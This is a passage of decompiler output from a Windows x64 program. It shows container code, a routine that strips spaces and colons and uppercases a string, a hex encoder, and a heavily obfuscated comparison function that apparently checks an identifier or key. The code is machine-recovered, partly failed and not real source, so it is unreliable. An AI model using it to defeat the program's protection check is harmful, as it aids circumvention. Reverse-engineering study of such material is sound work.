        uVar6 = *(undefined4 *)(puVar10 + 1);
        uVar7 = *(undefined4 *)((longlong)puVar10 + 0xc);
        *(undefined4 *)(puVar13 + -3) = *(undefined4 *)puVar10;
        *(undefined4 *)((longlong)puVar13 + -0x14) = uVar5;
        *(undefined4 *)(puVar13 + -2) = uVar6;
        *(undefined4 *)((longlong)puVar13 + -0xc) = uVar7;
        uVar8 = puVar10[3];
        puVar13[-1] = puVar10[2];
        *puVar13 = uVar8;
        *(undefined1 *)puVar10 = 0;
        puVar10[2] = 0;
        puVar10[3] = 0xf;
        puVar13[1] = puVar10[4];
        puVar11 = puVar10 + 5;
        puVar10 = puVar10 + 6;
        puVar13[2] = *puVar11;
        puVar13 = puVar13 + 6;
      } while (puVar10 != param_2);
    }
    puVar13 = (undefined8 *)param_1[1];
    if (param_2 != puVar13) {
      puVar11 = param_2 + 2;
      puVar10 = puVar17;
      do {
        puVar16 = puVar10 + 6;
        *puVar16 = 0;
        puVar10[7] = 0;
        puVar10[8] = 0;
        puVar10[9] = 0;
        uVar5 = *(undefined4 *)((longlong)puVar11 + -0xc);
        uVar6 = *(undefined4 *)(puVar11 + -1);
        uVar7 = *(undefined4 *)((longlong)puVar11 + -4);
        *(undefined4 *)puVar16 = *(undefined4 *)(puVar11 + -2);
        *(undefined4 *)((longlong)puVar10 + 0x34) = uVar5;
        *(undefined4 *)(puVar10 + 7) = uVar6;
        *(undefined4 *)((longlong)puVar10 + 0x3c) = uVar7;
        uVar8 = puVar11[1];
        puVar10[8] = *puVar11;
        puVar10[9] = uVar8;
        *(undefined1 *)(puVar11 + -2) = 0;
        *puVar11 = 0;
        puVar11[1] = 0xf;
        puVar10[10] = puVar11[2];
        puVar10[0xb] = puVar11[3];
        puVar2 = puVar11 + 4;
        puVar11 = puVar11 + 6;
        puVar10 = puVar16;
      } while (puVar2 != puVar13);
    }
  }
  lVar14 = *param_1;
  if (lVar14 != 0) {
    lVar12 = param_1[1];
    for (; lVar14 != lVar12; lVar14 = lVar14 + 0x30) {
      FUN_140025000(lVar14);
    }
    pvVar4 = (void *)*param_1;
    _Memory = pvVar4;
    if ((0xfff < (ulonglong)(((param_1[2] - (longlong)pvVar4) / 0x30) * 0x30)) &&
       (_Memory = *(void **)((longlong)pvVar4 + -8),
       0x1f < (ulonglong)((longlong)pvVar4 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
  }
  *param_1 = lVar9;
  param_1[1] = uVar1 * 0x30 + lVar9;
  param_1[2] = uVar15 * 0x30 + lVar9;
  return puVar17;
}



/* ==================================================================== */
/* FUN_140039d30 @ 140039d30 */

undefined8 * FUN_140039d30(undefined8 *param_1,byte *param_2)

{
  byte bVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  int iVar5;
  byte *pbVar6;
  longlong lVar7;
  ulonglong uVar8;
  byte *pbVar9;
  longlong lVar10;
  byte *pbVar11;
  byte *pbVar12;
  ulonglong uVar13;

  if (*(ulonglong *)(param_2 + 0x18) < 0x10) {
    pbVar11 = param_2 + *(longlong *)(param_2 + 0x10);
    pbVar12 = param_2 + *(longlong *)(param_2 + 0x10);
    pbVar6 = param_2;
  }
  else {
    pbVar6 = *(byte **)param_2;
    pbVar11 = pbVar6 + *(longlong *)(param_2 + 0x10);
    pbVar12 = pbVar6 + *(longlong *)(param_2 + 0x10);
  }
  if (pbVar6 != pbVar11) {
    do {
      if ((*pbVar6 == 0x20) || (*pbVar6 == 0x3a)) break;
      pbVar6 = pbVar6 + 1;
    } while (pbVar6 != pbVar11);
    pbVar9 = pbVar6;
    if (pbVar6 != pbVar11) {
      while (pbVar9 = pbVar9 + 1, pbVar9 != pbVar11) {
        bVar1 = *pbVar9;
        if ((bVar1 != 0x20) && (bVar1 != 0x3a)) {
          *pbVar6 = bVar1;
          pbVar6 = pbVar6 + 1;
        }
      }
    }
  }
  if (*(ulonglong *)(param_2 + 0x18) < 0x10) {
    pbVar9 = param_2;
    pbVar11 = param_2;
  }
  else {
    pbVar9 = *(byte **)param_2;
    pbVar11 = *(byte **)param_2;
  }
  lVar7 = (longlong)pbVar6 - (longlong)pbVar11;
  uVar8 = *(longlong *)(param_2 + 0x10) - lVar7;
  uVar13 = (longlong)pbVar12 - (longlong)pbVar6;
  if (uVar8 < (ulonglong)((longlong)pbVar12 - (longlong)pbVar6)) {
    uVar13 = uVar8;
  }
  lVar10 = *(longlong *)(param_2 + 0x10) - uVar13;
  memmove(pbVar9 + lVar7,pbVar9 + lVar7 + uVar13,(lVar10 - lVar7) + 1);
  *(longlong *)(param_2 + 0x10) = lVar10;
  if (*(ulonglong *)(param_2 + 0x18) < 0x10) {
    pbVar11 = param_2;
  }
  else {
    pbVar11 = *(byte **)param_2;
  }
  pbVar12 = pbVar11 + lVar10;
  for (; pbVar11 != pbVar12; pbVar11 = pbVar11 + 1) {
    iVar5 = toupper((uint)*pbVar11);
    *pbVar11 = (byte)iVar5;
  }
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  uVar2 = *(undefined4 *)(param_2 + 4);
  uVar3 = *(undefined4 *)(param_2 + 8);
  uVar4 = *(undefined4 *)(param_2 + 0xc);
  *(undefined4 *)param_1 = *(undefined4 *)param_2;
  *(undefined4 *)((longlong)param_1 + 4) = uVar2;
  *(undefined4 *)(param_1 + 1) = uVar3;
  *(undefined4 *)((longlong)param_1 + 0xc) = uVar4;
  uVar2 = *(undefined4 *)(param_2 + 0x14);
  uVar3 = *(undefined4 *)(param_2 + 0x18);
  uVar4 = *(undefined4 *)(param_2 + 0x1c);
  *(undefined4 *)(param_1 + 2) = *(undefined4 *)(param_2 + 0x10);
  *(undefined4 *)((longlong)param_1 + 0x14) = uVar2;
  *(undefined4 *)(param_1 + 3) = uVar3;
  *(undefined4 *)((longlong)param_1 + 0x1c) = uVar4;
  *param_2 = 0;
  param_2[0x10] = 0;
  param_2[0x11] = 0;
  param_2[0x12] = 0;
  param_2[0x13] = 0;
  param_2[0x14] = 0;
  param_2[0x15] = 0;
  param_2[0x16] = 0;
  param_2[0x17] = 0;
  param_2[0x18] = 0xf;
  param_2[0x19] = 0;
  param_2[0x1a] = 0;
  param_2[0x1b] = 0;
  param_2[0x1c] = 0;
  param_2[0x1d] = 0;
  param_2[0x1e] = 0;
  param_2[0x1f] = 0;
  FUN_140025000(param_2);
  return param_1;
}



/* ==================================================================== */
/* FUN_140039e90 @ 140039e90 */

undefined8 * FUN_140039e90(undefined8 *param_1,byte *param_2,uint param_3,undefined8 param_4)

{
  ulonglong uVar1;

  uVar1 = (ulonglong)param_3;
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0xf;
  *(undefined1 *)param_1 = 0;
  FUN_140023210(0,param_3 * 2,param_3,param_4,1);
  if (param_3 != 0) {
    do {
      FUN_140023330(param_1,"0123456789ABCDEF"[*param_2 >> 4]);
      FUN_140023330(param_1,"0123456789ABCDEF"[*param_2 & 0xf]);
      param_2 = param_2 + 1;
      uVar1 = uVar1 - 1;
    } while (uVar1 != 0);
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140039f40 @ 140039f40 */
/* DECOMPILE FAILED: Exception while decompiling 140039f40: process: timeout
 */

/* ==================================================================== */
/* FUN_14004e410 @ 14004e410 */

void FUN_14004e410(longlong *param_1)

{
  basic_ios<char,std::char_traits<char>_> *this;

  this = (basic_ios<char,std::char_traits<char>_> *)(param_1 + 0x16);
  *(undefined ***)(this + (longlong)*(int *)(*param_1 + 4) + -0xb0) = &PTR_LAB_140057348;
  *(int *)(this + (longlong)*(int *)(*param_1 + 4) + -0xb4) = *(int *)(*param_1 + 4) + -0xb0;
  FUN_1400243b0(param_1 + 2);
  std::basic_istream<char,std::char_traits<char>_>::~basic_istream<char,std::char_traits<char>_>
            ((basic_istream<char,std::char_traits<char>_> *)(param_1 + 3));
                    /* WARNING: Could not recover jumptable at 0x00014004e467. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  std::basic_ios<char,std::char_traits<char>_>::~basic_ios<char,std::char_traits<char>_>(this);
  return;
}



/* ==================================================================== */
/* FUN_14004e470 @ 14004e470 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined1 FUN_14004e470(undefined8 param_1,undefined8 param_2)

{
  ulonglong uVar1;
  char cVar2;
  undefined8 uVar3;
  ulonglong uVar4;
  byte bVar5;
  byte bVar6;
  byte bVar7;
  ulonglong uVar8;
  longlong lVar9;
  ulonglong uVar10;
  ulonglong uVar11;
  ulonglong uVar12;
  byte bVar13;
  char cVar14;
  byte in_stack_007841bd;
  byte in_stack_0097ac36;
  undefined1 in_stack_00e0e1aa;
  undefined1 in_stack_014fac90;
  undefined1 in_stack_01677180;
  undefined1 in_stack_016f6c44;
  undefined1 auStack_138 [32];
  byte local_118;
  byte abStack_109 [32];
  byte abStack_e9 [32];
  byte abStack_c9 [32];
  byte abStack_a9 [41];
  undefined1 local_80 [32];
  undefined1 local_60 [16];
  longlong local_50;
  undefined1 local_40 [16];
  longlong local_30;
  ulonglong local_20;

  local_20 = DAT_14005d040 ^ (ulonglong)auStack_138;
  FUN_140039f40(local_40,param_1);
  uVar3 = FUN_140023590(local_80,param_2);
  FUN_140039d30(local_60,uVar3);
  if ((local_30 == 0) || (local_50 == 0)) {
    abStack_109[1] = 0x26;
    abStack_109[2] = 0x35;
    abStack_109[3] = 0x34;
    abStack_109[4] = 0x33;
    abStack_109[5] = 0;
    abStack_109[6] = 0;
    abStack_109[7] = 0;
    abStack_109[8] = 0;
    abStack_109[9] = 0;
    abStack_109[10] = 0;
    abStack_109[0xb] = 0;
    abStack_109[0xc] = 0;
    abStack_109[0xd] = 0;
    abStack_109[0xe] = 0;
    abStack_109[0xf] = 0;
    abStack_109[0x10] = 0;
    abStack_109[0x11] = 0;
    abStack_109[0x12] = 0;
    abStack_109[0x13] = 0;
    abStack_109[0x14] = 0;
    abStack_109[0x15] = 0;
    abStack_109[0x16] = 0;
    abStack_109[0x17] = 0;
    abStack_109[0x18] = 0;
    abStack_109[0x19] = 0;
    abStack_109[0x1a] = 0;
    abStack_109[0x1b] = 0;
LAB_1400501c0:
    uVar11 = DAT_140a618c8;
    uVar4 = DAT_140a618d0;
LAB_1400501d0:
    uVar12 = 0;
    uVar10 = uVar4;
LAB_1400501d2:
    if (uVar12 < 0x1b) {
      bVar13 = abStack_109[uVar12 + 1];
      bVar7 = (byte)uVar12;
LAB_1400501e5:
      if (uVar12 < uVar11) goto LAB_140050c89;
      if (uVar10 + 1 <= uVar11) {
        if (uVar11 == uVar10 + 1) {
          local_118 = bVar7 + 0x6b + bVar13 + (bVar13 & bVar7 + 0x6b) * -2 + 0x13;
          uVar12 = uVar12 + abStack_109[uVar12 + 1] + uVar10 + 1;
        }
        else {
          if (uVar11 == uVar10 + 2) {
            local_118 = bVar13 + (bVar13 & bVar7 + 0x5d) * -2 + 'u' + bVar7 + 0x5d;
            goto LAB_140050bdc;
          }
          if (uVar11 == uVar10 + 3) {
            local_118 = bVar7 + 0x25;
            cVar2 = bVar13 + (bVar13 & local_118) * -2 + -3;
            goto LAB_140050b87;
          }
          if (uVar11 != uVar10 + 7) goto LAB_140050240;
          local_118 = (bVar7 + bVar13 + (bVar7 + 9 & bVar13) * -2) - 0x36;
          uVar10 = uVar10 + 1;
        }
        goto LAB_1400501d2;
      }
      local_118 = bVar7 + 0x79 + (bVar7 + 0x79 & bVar13) * -2 + -0x4f + bVar13;
LAB_140050240:
      if (uVar12 < uVar10) {
        in_stack_007841bd = in_stack_016f6c44;
        goto LAB_140050c89;
      }
      if (uVar10 + 0x10 <= uVar11) {
        if (uVar11 == uVar10 + 1) {
          local_118 = (bVar13 + bVar7 + (bVar7 - 0x21 & bVar13) * -2) - 0x3a;
          goto LAB_140050b28;
        }
        if (uVar11 == uVar10 + 2) {
          local_118 = ('\r' - (bVar7 - 0x2f & bVar13)) * '\x02' + bVar7 + bVar13;
          uVar10 = uVar10 + 1;
        }
        else {
          if (uVar11 != uVar10 + 3) {
            if (uVar11 != uVar10 + 5) {
              if (uVar11 == uVar10 + 4) {
                local_118 = bVar13 + bVar7 + (bVar7 + 0x8b & bVar13) * -2 + 0xbe;
                goto LAB_140050a88;
              }
              if (uVar11 != uVar10 + 9) goto LAB_1400502c0;
              local_118 = ('3' - (bVar7 + 0x6f & bVar13)) * '\x02' + bVar7 + bVar13;
              uVar12 = uVar12 + abStack_109[uVar12 + 1] + uVar10 + 1;
              goto LAB_1400501d2;
            }
            local_118 = ('5' - (bVar7 + 0x99 & bVar13)) * '\x02' + bVar7 + bVar13;
            goto LAB_140050baa;
          }
          local_118 = ('7' - (bVar7 - 0x3d & bVar13)) * '\x02' + bVar7 + bVar13;
        }
        goto LAB_1400501d2;
      }
      local_118 = ('9' - (bVar7 - 0x13 & bVar13)) * '\x02' + bVar7 + bVar13;
LAB_1400502c0:
      while( true ) {
        uVar4 = uVar10;
        if (uVar11 + uVar10 <= uVar12) break;
        while( true ) {
          do {
            uVar10 = uVar4;
            uVar8 = uVar10 + 4;
            if (uVar11 == uVar8) {
              local_118 = ('\x06' - (bVar7 - 2 & bVar13)) * '\x02' + bVar7 + bVar13;
              goto LAB_140050b28;
            }
            if (uVar11 == uVar10 + 6) {
              local_118 = ('0' - (bVar7 - 0x10 & bVar13)) * '\x02' + bVar7 + bVar13;
              uVar10 = uVar10 + 1;
              goto LAB_1400501d2;
            }
            if (uVar11 == uVar10 + 0x5a) {
              local_118 = bVar13 + bVar7 + (bVar7 - 0x1e & bVar13) * -2 + 0xb4;
              goto LAB_1400501d2;
            }
            if (uVar11 == uVar10 + 1) {
              local_118 = ('\x04' - (bVar7 - 0x2c & bVar13)) * '\x02' + bVar7 + bVar13;
              goto LAB_140050b8a;
            }
            if (uVar11 == uVar10 + 3) {
              local_118 = ('.' - (bVar7 - 0x3a & bVar13)) * '\x02' + bVar7 + bVar13;
              goto LAB_140050ba7;
            }
            if (uVar11 == uVar10 + 0x61) {
              local_118 = bVar13 + bVar7 + (bVar7 + 0xb8 & bVar13) * -2 + 0xb0;
              goto LAB_140050baa;
            }
            if (uVar11 == uVar10 + 0x41) {
              local_118 = ('\x02' - (bVar7 + 0xaa & bVar13)) * '\x02' + bVar7 + bVar13;
              goto LAB_140050a88;
            }
            if (uVar11 == uVar10 + 0x80) {
              local_118 = (',' - (bVar7 + 0x9c & bVar13)) * '\x02' + bVar7 + bVar13;
              goto LAB_140050bdc;
            }
            if (uVar11 == uVar10 + 1000) {
              local_118 = bVar13 + bVar7 + (bVar7 + 0x8e & bVar13) * -2 + 0xac;
              uVar12 = uVar12 + abStack_109[uVar12 + 1] + uVar10 + 1;
              goto LAB_1400501d2;
            }
            uVar4 = uVar10;
          } while (uVar11 == uVar10 + 0x1000);
          uVar4 = uVar10 + 0x44;
          if (uVar8 < uVar10 + 0x4a) {
            local_118 = ('?' - (bVar7 - 0x15 & bVar13)) * '\x02' + bVar7 + bVar13;
            goto LAB_1400501c0;
          }
          uVar11 = uVar8;
          if (uVar8 < uVar10 + 0x9e) {
            local_118 = (bVar13 + bVar7 + (bVar7 - 0x23 & bVar13) * -2) - 0x2e;
            goto LAB_1400501d0;
          }
          if (uVar8 < uVar10 + 0x45) {
            local_118 = ('\x13' - (bVar7 - 0x31 & bVar13)) * '\x02' + bVar7 + bVar13;
            uVar10 = uVar4;
            goto LAB_1400501e5;
          }
          if (uVar8 < uVar10 + 0x444) {
            local_118 = ('=' - (bVar7 - 0x3f & bVar13)) * '\x02' + bVar7 + bVar13;
            uVar10 = uVar4;
            goto LAB_140050240;
          }
          if (uVar8 < uVar10 + 0xa5) break;
          if (uVar8 < uVar10 + 0x85) {
            bVar5 = bVar7 + 0xa5;
            cVar2 = '\x11';
            uVar10 = uVar4;
            goto LAB_140050685;
          }
          if (uVar8 < uVar10 + 0xc4) {
            bVar5 = bVar7 + 0x97;
            cVar2 = ';';
            uVar10 = uVar4;
            goto LAB_140050641;
          }
          if (uVar8 < uVar10 + 0x42c) {
            cVar2 = bVar7 + (bVar7 + 0x89 & bVar13) * -2 + -0x36;
            uVar10 = uVar4;
            goto LAB_140050610;
          }
          if (uVar8 < uVar10 + 0x1044) {
            local_118 = ('\x0f' - (bVar7 + 0x7b & bVar13)) * '\x02' + bVar7 + bVar13;
            uVar10 = uVar4;
            goto LAB_1400505f0;
          }
          if (uVar10 + 0x84 <= uVar8) {
            uVar11 = uVar10 + 0xbe;
            uVar4 = uVar10 + 0x122;
            if (uVar10 + 0x17c < uVar11) {
              local_118 = (bVar13 + bVar7 + (bVar7 - 0x28 & bVar13) * -2) - 0x10;
              uVar12 = uVar12 + abStack_109[uVar12 + 1] + uVar4 + 1;
              uVar10 = uVar4;
              goto LAB_1400501d2;
            }
            if (uVar10 + 0x123 < uVar11) {
              local_118 = ('\"' - (bVar7 - 0x36 & bVar13)) * '\x02' + bVar7 + bVar13;
              uVar10 = uVar4;
              goto LAB_140050bdc;
            }
            if (uVar10 + 0x522 < uVar11) {
              local_118 = bVar13 + bVar7 + (bVar7 + 0xbc & bVar13) * -2 + 0x98;
              uVar10 = uVar4;
              goto LAB_140050a88;
            }
            if (uVar10 + 0x183 < uVar11) {
              local_118 = (bVar13 + bVar7 + (bVar7 + 0xae & bVar13) * -2) - 0x14;
              uVar10 = uVar4;
              goto LAB_140050baa;
            }
            if (uVar10 + 0x163 < uVar11) {
              local_118 = (' ' - (bVar7 + 0xa0 & bVar13)) * '\x02' + bVar7 + bVar13;
              uVar10 = uVar4;
              goto LAB_140050ba7;
            }
            if (uVar10 + 0x1a2 < uVar11) {
              local_118 = bVar13 + bVar7 + (bVar7 + 0x92 & bVar13) * -2 + 0x94;
              uVar10 = uVar4;
              goto LAB_140050b8a;
            }
            if (uVar10 + 0x50a < uVar11) {
              local_118 = (bVar13 + bVar7 + (bVar7 + 0x84 & bVar13) * -2) - 0x18;
              uVar10 = uVar4;
              goto LAB_1400501d2;
            }
            if (uVar10 + 0x142 < uVar11) {
              local_118 = ('\x1e' - (bVar7 + 0x76 & bVar13)) * '\x02' + bVar7 + bVar13;
              uVar10 = uVar10 + 0x123;
              goto LAB_1400501d2;
            }
            if (uVar10 + 0x162 < uVar11) {
              local_118 = bVar13 + bVar7 + (bVar7 + 0x68 & bVar13) * -2 + 0x90;
              uVar10 = uVar4;
              goto LAB_140050b28;
            }
            if (uVar11 <= uVar10 + 0x186) {
              uVar11 = uVar10 + 0x17c;
              uVar4 = uVar10 + 0x185;
            }
          }
        }
        local_118 = bVar7 + (bVar7 + 0xb3 & bVar13) * -2 + -0x32 + bVar13;
        uVar10 = uVar4;
      }
      if (uVar11 < uVar10 + 0x400) {
        bVar5 = bVar7 + 0x79;
        cVar2 = '\x15';
LAB_140050685:
        local_118 = (cVar2 - (bVar5 & bVar13)) * '\x02' + bVar7 + bVar13;
LAB_140050691:
        if (uVar11 + uVar10 != 0x400) {
          if (uVar10 + 3 < uVar11) {
            bVar5 = bVar7 - 0x2b;
            cVar2 = '\x01';
LAB_140050641:
            local_118 = (cVar2 - (bVar5 & bVar13)) * '\x02' + bVar7 + bVar13;
          }
          else {
            if (uVar11 == uVar10 + 1) {
              local_118 = ('+' - (bVar7 - 0x39 & bVar13)) * '\x02' + bVar7 + bVar13;
              goto LAB_140050b28;
            }
            if (uVar11 == uVar10 + 2) {
              local_118 = bVar13 + bVar7 + (bVar7 + 0xb9 & bVar13) * -2 + 0xaa;
              uVar10 = uVar10 + 1;
              goto LAB_1400501d2;
            }
            if (uVar11 == uVar10 + 3) {
              local_118 = (bVar13 + bVar7 + (bVar7 + 0x81 & bVar13) * -2) - 6;
              goto LAB_140050baa;
            }
            if (uVar11 == uVar10 + 8) {
              local_118 = (bVar13 + bVar7 + (bVar7 + 0x57 & bVar13) * -2) - 10;
              uVar12 = uVar12 + abStack_109[uVar12 + 1] + uVar10 + 1;
              goto LAB_1400501d2;
            }
          }
          if (0x27 < uVar11) {
            cVar2 = ((bVar13 - (bVar7 + 0x28 & bVar13)) + '\b') * '\x02';
            local_118 = bVar7;
LAB_140050b87:
            local_118 = cVar2 + local_118;
LAB_140050b8a:
            abStack_109[uVar12 + 1] =
                 bVar13 + (bVar13 & bVar7 + 0xa1) * -2 + -0x67 + bVar7 + 0xa1 + local_118;
LAB_140050ba7:
            uVar11 = uVar11 + uVar10;
LAB_140050baa:
            uVar12 = uVar12 - local_118;
            goto LAB_1400501d2;
          }
          if (uVar10 + 0x61 < uVar11) {
            cVar2 = (':' - (bVar7 - 0x3e & bVar13)) * '\x02' + bVar7;
LAB_140050610:
            local_118 = cVar2 + bVar13;
          }
          else {
            if (uVar11 == uVar10 + 1) {
              local_118 = (bVar13 + bVar7 + (bVar7 + 0xb4 & bVar13) * -2) - 0x38;
              uVar12 = uVar12 + abStack_109[uVar12 + 1] + uVar10 + 1;
              goto LAB_1400501d2;
            }
            if (uVar11 == uVar10 + 2) {
              local_118 = ('8' - (bVar7 + 0x98 & bVar13)) * '\x02' + bVar7 + bVar13;
              goto LAB_140050a88;
            }
            if (uVar11 == uVar10 + 3) {
              local_118 = ('\f' - (bVar7 + 0x7c & bVar13)) * '\x02' + bVar7 + bVar13;
              goto LAB_140050ba7;
            }
            if (uVar11 == uVar10 + 5) {
              local_118 = ('6' - (bVar7 + 0x6e & bVar13)) * '\x02' + bVar7 + bVar13;
              goto LAB_140050b8a;
            }
            if (uVar11 == uVar10 + 2) {
              local_118 = (bVar13 + bVar7 + (bVar7 + 0x60 & bVar13) * -2) - 0x40;
              goto LAB_1400501d2;
            }
          }
          if (uVar10 < 0x42) {
LAB_1400505f0:
            abStack_109[uVar12 + 1] = local_118;
            uVar12 = uVar12 + 1;
            goto LAB_1400501d2;
          }
          local_118 = (('\x1e' - (bVar7 + 0x36 & bVar13)) * '\x02' + bVar7 + bVar13) * '\x02';
LAB_140050b28:
          abStack_109[uVar12 + 1] = bVar13 + (bVar13 & bVar7 + 0xaf) * -2 + '7' + bVar7 + 0xaf;
          uVar10 = uVar10 + 1;
          goto LAB_1400501d2;
        }
        local_118 = ('2' - (bVar7 + 0x1a & bVar13)) * '\x02' + bVar7;
      }
      else {
        if (uVar11 == uVar10 + 1) {
          local_118 = (bVar13 + bVar7 + (bVar7 - 0x26 & bVar13) * -2) - 0x1c;
          uVar12 = uVar12 + abStack_109[uVar12 + 1] + uVar10 + 1;
          goto LAB_1400501d2;
        }
        if (uVar11 == uVar10 + 2) {
          local_118 = ('\x1c' - (bVar7 - 0x34 & bVar13)) * '\x02' + bVar7 + bVar13;
          goto LAB_140050bdc;
        }
        if (uVar11 != uVar10 + 3) {
          if (uVar11 != uVar10 + 5) {
            if (uVar11 == uVar10 + 4) {
              local_118 = (bVar13 + bVar7 + (bVar7 + 0x86 & bVar13) * -2) - 0x24;
              goto LAB_1400501d2;
            }
            if (uVar11 == uVar10 + 9) {
              local_118 = bVar13 + bVar7 + (bVar7 + 0x6a & bVar13) * -2 + 0x84;
              goto LAB_140050b28;
            }
            goto LAB_140050691;
          }
          local_118 = bVar13 + bVar7 + (bVar7 + 0x94 & bVar13) * -2 + 0x88;
          goto LAB_140050b8a;
        }
        local_118 = bVar13 + bVar7 + (bVar7 + 0xbe & bVar13) * -2 + 0x8c;
      }
LAB_140050a88:
      bVar7 = bVar13 + (bVar13 & bVar7 + 0x93) * -2 + -5 + bVar7 + 0x93;
      abStack_109[uVar12 + 1] = bVar7;
      uVar12 = uVar12 - ((ulonglong)bVar7 + uVar10 + 1);
      uVar10 = uVar10 + 1;
LAB_140050bdc:
      bVar7 = (char)uVar12 + 0xc;
      abStack_109[uVar12 + 1] = bVar7 + (bVar7 & bVar13) * -2 + -0x54 + bVar13;
      uVar11 = uVar11 + 1;
      lVar9 = uVar12 + (-1 - uVar11);
      uVar12 = lVar9 + abStack_109[lVar9 + 1] + uVar10 + 1;
      goto LAB_1400501d2;
    }
    in_stack_007841bd = abStack_109[1];
  }
  else {
    cVar2 = FUN_1400250d0(local_40,local_60);
    if (cVar2 != '\0') {
      abStack_c9[1] = 0xb4;
      abStack_c9[2] = 0x4d;
      abStack_c9[3] = 0x42;
      abStack_c9[4] = 0x43;
      abStack_c9[5] = 0;
      abStack_c9[6] = 0;
      abStack_c9[7] = 0;
      abStack_c9[8] = 0;
      abStack_c9[9] = 0;
      abStack_c9[10] = 0;
      abStack_c9[0xb] = 0;
      abStack_c9[0xc] = 0;
      abStack_c9[0xd] = 0;
      abStack_c9[0xe] = 0;
      abStack_c9[0xf] = 0;
      abStack_c9[0x10] = 0;
      abStack_c9[0x11] = 0;
      abStack_c9[0x12] = 0;
      abStack_c9[0x13] = 0;
      abStack_c9[0x14] = 0;
      abStack_c9[0x15] = 0;
      abStack_c9[0x16] = 0;
      abStack_c9[0x17] = 0;
      abStack_c9[0x18] = 0;
      abStack_c9[0x19] = 0;
      abStack_c9[0x1a] = 0;
      abStack_c9[0x1b] = 0;
      abStack_c9[0x1c] = 0;
      bVar13 = local_118;
LAB_14004e510:
      uVar4 = DAT_140a618c8;
      uVar11 = DAT_140a618d0;
LAB_14004e520:
      uVar8 = 0;
      uVar10 = uVar4;
      uVar12 = uVar11;
LAB_14004e522:
      if (0x1b < uVar8) {
        in_stack_0097ac36 = abStack_c9[1];
        goto LAB_14004f6a3;
      }
      bVar7 = abStack_c9[uVar8 + 1];
      cVar2 = (char)uVar8;
LAB_14004e535:
      if (uVar8 < uVar10) goto LAB_14004f6a3;
      uVar4 = uVar12 + 1;
      if (uVar4 <= uVar10) {
        if (uVar10 == uVar4) {
          bVar13 = ('\t' - (bVar7 & cVar2 + 0x22U)) * '\x02' + bVar7 + cVar2 + 0x22U;
          uVar8 = uVar8 + abStack_c9[uVar8 + 1] + uVar12 + 1;
        }
        else {
          if (uVar10 != uVar12 + 2) {
            if (uVar10 != uVar12 + 2) goto LAB_14004e586;
            bVar13 = ('\'' - (bVar7 & cVar2 + 0x3eU)) * '\x02' + bVar7 + cVar2 + 0x3eU;
            goto LAB_14004eb00;
          }
          bVar13 = ('\x0f' - (bVar7 & cVar2 + 0x8eU)) * '\x02' + bVar7 + cVar2 + 0x8eU;
LAB_14004eb56:
          bVar5 = (char)uVar8 - 0x38;
          abStack_c9[uVar8 + 1] = bVar5 + (bVar5 & bVar7) * -2 + -0x78 + bVar7;
          lVar9 = uVar8 + (-1 - (uVar10 + 1));
          uVar8 = lVar9 + abStack_c9[lVar9 + 1] + uVar12 + 1;
          uVar10 = uVar10 + 1;
        }
        goto LAB_14004e522;
      }
      bVar13 = bVar7 + (bVar7 & cVar2 + 0xb6U) * -2 + cVar2 + -0x44;
LAB_14004e586:
      if (uVar8 < uVar12) {
        in_stack_0097ac36 = in_stack_01677180;
        goto LAB_14004f6a3;
      }
      if (uVar12 + 0x1000 <= uVar10) {
        if (uVar10 == uVar4) {
          cVar14 = bVar7 + (cVar2 + 0x5aU & bVar7) * -2 + -0x1c;
LAB_14004eaba:
          bVar13 = cVar14 + cVar2;
LAB_14004eabd:
          abStack_c9[uVar8 + 1] = ('5' - (cVar2 + 0x3aU & bVar7)) * '\x02' + cVar2 + 0x3aU + bVar7;
          uVar12 = uVar12 + 1;
        }
        else {
          if (uVar10 != uVar12 + 2) {
            if (uVar10 != uVar12 + 5) {
              if (uVar10 != uVar12 + 3) goto LAB_14004e5e1;
              cVar14 = bVar7 + (cVar2 - 0x1eU & bVar7) * -2 + -0x4c;
LAB_14004ea3b:
              bVar13 = cVar14 + cVar2;
              bVar5 = cVar2 + 0x12U + (cVar2 + 0x12U & bVar7) * -2 + -0x7e + bVar7;
              abStack_c9[uVar8 + 1] = bVar5;
              uVar8 = uVar8 - ((ulonglong)bVar5 + uVar12 + 1);
              uVar12 = uVar12 + 1;
              goto LAB_14004eb56;
            }
            bVar13 = ('\x1e' - (cVar2 + 0x76U & bVar7)) * '\x02' + bVar7 + cVar2;
            goto LAB_14004eb21;
          }
          bVar13 = ('.' - (cVar2 - 0x3aU & bVar7)) * '\x02' + bVar7 + cVar2;
          uVar12 = uVar12 + 1;
        }
        goto LAB_14004e522;
      }
      bVar13 = ('6' - (cVar2 - 0x12U & bVar7)) * '\x02' + cVar2 + bVar7;
LAB_14004e5e1:
      if (uVar8 < uVar10 + uVar12) {
        while( true ) {
          if (uVar10 == uVar12 + 0x41) {
            bVar13 = bVar7 + (cVar2 + 0x34U & bVar7) * -2 + -0x38 + cVar2;
            goto LAB_14004eabd;
          }
          if (uVar10 == uVar12 + 1) {
            bVar13 = (' ' - (cVar2 + 0xa0U & bVar7)) * '\x02' + bVar7 + cVar2;
            uVar12 = uVar12 + 1;
            goto LAB_14004e522;
          }
          uVar4 = uVar12 + 4;
          if (uVar10 == uVar4) {
            bVar13 = cVar2 + bVar7 + (cVar2 + 0xcU & bVar7) * -2 + 0xb8;
            goto LAB_14004e522;
          }
          if (uVar10 == uVar12 + 8) {
            bVar13 = ('\x18' - (cVar2 + 0x78U & bVar7)) * '\x02' + cVar2 + bVar7;
            goto LAB_14004eb00;
          }
          uVar11 = uVar12 + 5;
          if (uVar4 < uVar12 + 0xd) {
            bVar13 = ('\x1a' - (cVar2 + 0x22U & bVar7)) * '\x02' + cVar2 + bVar7;
            goto LAB_14004e510;
          }
          if (uVar4 < uVar12 + 6) {
            bVar13 = bVar7 + cVar2 + (cVar2 + 0x8eU & bVar7) * -2 + 0xac;
            goto LAB_14004e520;
          }
          uVar1 = uVar12 + 9;
          if (uVar4 < uVar1) break;
          uVar4 = uVar12 + 10;
          uVar10 = uVar1;
          if (uVar12 + 0x12 < uVar1) {
